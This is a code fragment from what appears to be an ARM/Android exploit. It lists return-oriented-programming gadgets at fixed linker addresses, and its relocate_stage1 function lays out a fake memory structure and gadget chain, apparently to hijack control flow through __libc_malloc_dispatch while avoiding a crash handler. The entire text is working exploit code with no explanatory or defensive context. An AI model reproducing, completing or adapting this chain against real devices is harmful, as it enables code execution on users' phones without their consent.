// [ Linker gadgets ] ------------------------------------------------------------------

STR_R2_R0 = 0xb0003728 + 1 // str r2, [r0] ; bx lr
STR_R2_R3 = 0xb0005700 + 1 // str r2, [r3] ; bx lr

POP_7_PC = 0xb00058fc + 1 // pop {r0, r1, r2, r3, r4, r5, r6, pc}

POP_0X24_PC = 0xb000533c + 1 // add sp, //0x14 ; pop {r4, r5, r6, r7, pc}
POP_R0_R6_PC = 0xb00058fc + 1 // pop {r0, r1, r2, r3, r4, r5, r6, pc}

SP_PLUS_0xC = 0xb0005cb4 + 1 // add sp, //0xc ; bx lr
SP_PLUS_0x8 = 0xb00056c8 + 1 // add sp, //8 ; bx lr

NOP = 0xb00036e0 + 1 // bx lr

// base: first address - 0x8 [e.g. 0x70000000]
function relocate_stage1(base) {

return [
    [base + 0x0008, 0x41414141],    // BASE
    [base + 0x0278, NOP],           // 000019F8 .text:sub_59DC18BC+10 BLX R7 LR=59DC18CF

    // This will place __libc_malloc_dispatch at base + 0x0008
    [base + 0x0258, STR_R2_R3],     // 000019F8 .text:sub_59DC18BC+1E BLX R6 LR=59DC18DD
    [base + 0x0270, NOP],           // 000019F8 .text:sub_59DC18BC+2A BLX R1 LR=59DC18E9
    [base + 0x0250, NOP],           // 000019F8 .text:sub_59DC18BC+3A BLX R3 LR=59DC18F9


    // call_1
    [base + 0x027c, SP_PLUS_0x8], 
    [base + 0x030c, POP_R0_R6_PC],
    // [base + 0x027c, NOP], 
    // [base + 0x030c, NOP],
    // ---
    [base + 0x025c, NOP],
    // call_3
    // [base + 0x0274, POP_0X24_PC],
    [base + 0x0274, NOP],
    [base + 0x0254, NOP],
    [base + 0x0218, NOP],
    // Interesting chain
    [base + 0x0028, base + 0x0300],
    [base + 0x0308, base + 0x0300],
    [base + 0x0314, base + 0x0300],
    [base + 0x0320, base + 0x0300],
    [base + 0x031c, base + 0x0300],
    // -------------------------
    [base + 0x0350, base + 0x0250],
    [base + 0x0304, base + 0x0350],
    [base + 0x0350, base + 0x0320],
    [base + 0x0020, 0xdecafbad],
    [base + 0x0024, 0xdeadbeef],
    [base + 0x0028, base + 0x0300],
    [base + 0x002c, 0xdeadbeef],
    [base + 0x031c, base + 0x0300],
    // [base + 0x0010, 0x00000000],

    // This part is to prevent "unexpectedcrash" from crashing after [base + 0x00008]
    // has been changed
    [base + 0x0100, base + 0x0100],
    [base + 0x0108, NOP],
    [base + 0x010c, NOP],
    [base + 0x0110, NOP],
    [base + 0x012c, NOP],
    [base + 0x01d4, base + 0x0100],
    [base + 0x0118, 0x00000000],    
    // -----------------------

    [base + 0x0300, base + 0x0000],
    [base + 0x0210, NOP],

    [base + 0x0200, NOP],
    [base + 0x001c, base + 0x0000],
    [base + 0x03c8, 0xc0ffee00],

    [base + 0x0280, NOP],
    [base + 0x029c, NOP],
    [base + 0x00dc, base + 0x0000], // was 400
    [base + 0x02f8, 0xffffffff],

    [base + 0x0400, 0x00000000],
    [base + 0x000c, base + 0x00ac],
    [base + 0x0014, base + 0x0200],
    [base + 0x0200, 0x12345678],
    [base + 0x00b4, NOP]
];
}